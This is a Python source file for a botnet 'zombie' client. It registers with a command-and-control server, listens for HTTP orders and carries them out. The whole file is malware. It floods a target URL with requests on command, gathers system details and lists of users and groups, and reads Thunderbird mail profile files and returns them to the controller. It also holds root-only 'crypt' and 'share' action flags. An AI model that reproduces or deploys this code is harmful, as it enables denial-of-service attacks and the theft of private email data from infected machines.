import os
import time
import getpass
import requests
import platform
import grp
from pathlib import Path
import json
import uuid
from http.server import BaseHTTPRequestHandler, HTTPServer


CnCIp = "http://127.0.0.1:8080"



class Action:
    def __init__(self,type:str,target:str|None=None) -> None:
        self.type = type
        self.time:int = int(time.time())
        self.target = target
    
    def __str__(self) -> str:
        return self.type


class Zombie:
    def __init__(self,id:str,ip:str,status:bool=True) -> None:
        self.id = id
        self.ip = ip
        self.status = status
        self.port = None
        self.allowedActions:dict = getAllowedAction()
        self.pastActions:list[Action] = []
    
    def __str__(self) -> str:
        return self.id

    def __getitem__(self,idx:int) -> Action:
        return self.pastActions[idx]

    def getStatus(self) -> bool:
        return self.status
    
    def setStatus(self,newStatus:bool) -> None:
        self.status = newStatus
    
    def setPort(self,newPort:int) -> None:
        self.port = newPort
    
    def newIp(self,newIp:str) -> None:
        self.ip = newIp
    
    def connectToCnC(self,ports:list[int]) -> None:
        response = requests.post(CnCIp+"/zombie",json={"ip":self.ip,"id":self.id,"ports":ports})
        print(response.text)
    
    def isActionAllowed(self,action:Action) -> bool:
        return self.allowedActions[action.type]

    def getAllowedActions(self) -> dict:
        return self.allowedActions
    
    def addAction(self,action:Action) -> None:
        self.pastActions.append(action)
    
    def DDOSAttack(self,target:str,method:str,level:int|None=None,redirect:bool|None=None,rounds:int=1,payload:bool|None=None) -> None:
        if rounds == 0:
            rounds = 1
        try:
            for _ in range(rounds):
                requests.get(target)
        except Exception as e:
            raise Exception(e)
    
    def getSystemInfo(self,types:list[str]) -> dict[str,any]:
        uname = platform.uname()
        data = {}
        if "system" in types:
            data["system"] = uname.system
        if "node" in types:
            data["node"] = uname.node
        if "version" in types:
            data["version"] = uname.version
        if "machine" in types:
            data["machine"] = uname.machine
        if "processor" in types:
            data["processor"] = uname.processor
        if "username" in types:
            data["username"] = []
            groups = grp.getgrall()
            for group in groups:
                for user in group[3]:
                    data["username"].append((user,group[0]))
        return data
    
    def getEmails(self) -> dict[str,any]|None:
        data = {}
        userPath = os.path.expanduser("~")
        if not os.path.exists(f'{userPath}/.thunderbird'):
            return None
        if os.path.isfile(f'{userPath}/.thunderbird/profiles.ini'):
            profile = open(f'{userPath}/.thunderbird/profiles.ini').read()
            data["profile"] = profile
        dirs = os.listdir(f'{userPath}/.thunderbird')
        dir = ""
        idx = 0
        while dir == "" and idx != len(dirs):
            if dirs[idx].endswith("default"):
                dir = dirs[idx]
            idx += 1
        if dir == "":
            return data
        thunderPath = userPath + "/.thunderbird/" + dir
        if not os.path.isfile(thunderPath+"/times.json"):
            return data
        with open(thunderPath+"/times.json") as jsrd:
            data["times"] = json.load(jsrd)
        dirsThunder = os.listdir(thunderPath)
        for dirThunder in dirsThunder:
            if not os.path.isdir(thunderPath+"/"+dirThunder) and dirThunder.endswith(".map") and dirThunder != "times.json":
                mapFile = open(thunderPath+"/"+dirThunder).read()
                data[dirThunder] = mapFile
        return data
        




def getAllowedAction() -> dict:
    return {
        "ddos":True,
        "crypt": getpass.getuser() == "root",
        "share":getpass.getuser() == "root"
    }

def loadConfig(fileName:str) -> dict[str,any]:
    with open(fileName) as jsonFile:
        try:
            data:dict[str,any] = json.load(jsonFile)
        except:
            return createConfig()
        if "ip" not in data or "id" not in data:
            return createConfig()
        return data

def createConfig() -> dict[str,any]:
    my_ip = "127.0.0.1"#requests.get('https://api.ipify.org').text
    my_id = uuid.uuid4().hex
    time_creation = int(time.time())
    data = {
        "ip":my_ip,
        "id":my_id,
        "ports":[
            3000,
            4444,
            6212
        ],
        "time":time_creation
    }
    with open("config.json","w") as jsonFile:
        json.dump(data,jsonFile,indent=4)
    return data


class Server(BaseHTTPRequestHandler):
    def _set_headers(self,response=200):
        self.send_response(response)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
    def do_HEAD(self):
        self._set_headers()
        
    def do_POST(self):
        
        try:
            self.data_string = self.rfile.read(int(self.headers['Content-Length']))
            data = json.loads(self.data_string)
            returnData = manageData(data)
        except Exception as e:
            self._set_headers(response=400)
            self.wfile.write(str(e).encode('utf-8'))
            return
        
        self._set_headers()
        self.wfile.write(json.dumps(returnData, indent=2).encode('utf-8'))
        return



def manageData(data:dict) -> any:
    if not "id" in data or data["id"] != str(globalZombie):
        raise Exception("Id Not Valid")
    if "ddos" in data and data["ddos"]["target"] != "":
        action = Action("ddos",data["ddos"]["target"])
        try:
            method = "GET" if not "method" in data["ddos"] else data["ddos"]["method"]
            level = None if not "level" in data["ddos"] else data["ddos"]["level"]
            redirect = None if not "redirect" in data["ddos"] else data["ddos"]["redirect"]
            rounds = 1 if not "rounds" in data["ddos"] and data["ddos"]["rounds"] == 0 else data["ddos"]["rounds"]
            payload = None if not "payload" in data["ddos"] else data["ddos"]["payload"]
            globalZombie.DDOSAttack(data["ddos"]["target"],method,level,redirect,rounds,payload)
        except Exception as e:
            raise e
        globalZombie.addAction(action)
        return {'ddos':data["ddos"]["target"],'rounds':rounds}
    
    elif "info" in data and data["info"] != None:
        action = Action("info")
        system = globalZombie.getSystemInfo(data["info"])
        globalZombie.addAction(action)
        return system
    
    elif "email" in data and data["email"] == True:
        action = Action("email")
        email = globalZombie.getEmails()
        globalZombie.addAction(action)
        if not email:
            raise Exception("Can't Get Emails")
        return email
    
    raise Exception("Ddos or Info needed")


def startServer(config:dict[str,any]) -> None:

    serverAddr = (config["ip"],config["ports"][0])

    httpd = HTTPServer(serverAddr,Server)
    print("Server start")
    httpd.serve_forever()


globalZombie: Zombie|None


def main():
    global globalZombie
    if Path("config.json").is_file():
        config = loadConfig("config.json")
    else:
        config = createConfig()
    zombie = Zombie(config["id"],config["ip"],status=False)
    zombie.setPort(config["ports"][0])
    zombie.connectToCnC(config["ports"])

    zombie.setStatus(True)
    globalZombie = zombie
    startServer(config)





if __name__ == "__main__":
    main()

